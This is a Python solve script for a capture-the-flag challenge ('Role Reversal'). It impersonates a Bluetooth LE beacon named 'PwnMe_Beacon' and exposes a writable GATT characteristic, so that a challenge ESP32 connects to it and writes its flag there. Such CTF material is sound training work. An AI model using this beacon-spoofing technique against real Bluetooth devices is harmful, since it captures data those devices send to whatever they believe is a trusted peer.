#!/usr/bin/env python3
"""
THCON 2026 - Challenge 06: Role Reversal
Solve script: advertise as 'PwnMe_Beacon' and expose a writable GATT characteristic.
The ESP32 (Central) will scan, connect, and write the flag to the characteristic.

Requirements:
    pip install bless
"""

import argparse
import asyncio
import logging
from typing import Any, Union

from bless import (
    BlessServer,
    BlessGATTCharacteristic,
    GATTCharacteristicProperties,
    GATTAttributePermissions,
)

logging.basicConfig(level=logging.WARNING)

DEVICE_NAME    = "PwnMe_Beacon"
SERVICE_UUID   = "12345678-0000-1000-8000-00805f9b34fb"
FLAG_CHAR_UUID = "deadbeef-0000-1000-8000-00805f9b34fb"

flag_event = asyncio.Event()


def read_request(characteristic: BlessGATTCharacteristic, **kwargs) -> bytearray:
    return characteristic.value or bytearray()


def write_request(characteristic: BlessGATTCharacteristic, value: Any, **kwargs):
    characteristic.value = value
    decoded = bytes(value).decode("utf-8", errors="ignore")
    print(f"\n[!!!] FLAG RECEIVED: {decoded}")
    flag_event.set()


async def main(adapter: str):
    server = BlessServer(name=DEVICE_NAME, adapter=adapter)
    server.read_request_func  = read_request
    server.write_request_func = write_request

    await server.add_new_service(SERVICE_UUID)

    char_props = (
        GATTCharacteristicProperties.write |
        GATTCharacteristicProperties.write_without_response
    )
    char_perms = GATTAttributePermissions.writeable

    await server.add_new_characteristic(
        SERVICE_UUID,
        FLAG_CHAR_UUID,
        char_props,
        None,
        char_perms,
    )

    await server.start()
    print(f"[*] Using adapter      : {adapter}")
    print(f"[*] Advertising as '{DEVICE_NAME}'")
    print(f"[*] Characteristic UUID : {FLAG_CHAR_UUID}")
    print(f"[*] Waiting for ESP32 to connect and deliver the flag...")

    await flag_event.wait()

    await server.stop()
    print("[*] Done.")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Challenge 06 - Role Reversal solve script")
    parser.add_argument(
        "-i", "--interface",
        default="hci0",
        metavar="IFACE",
        help="Bluetooth adapter to use (default: hci0)",
    )
    args = parser.parse_args()
    asyncio.run(main(args.interface))
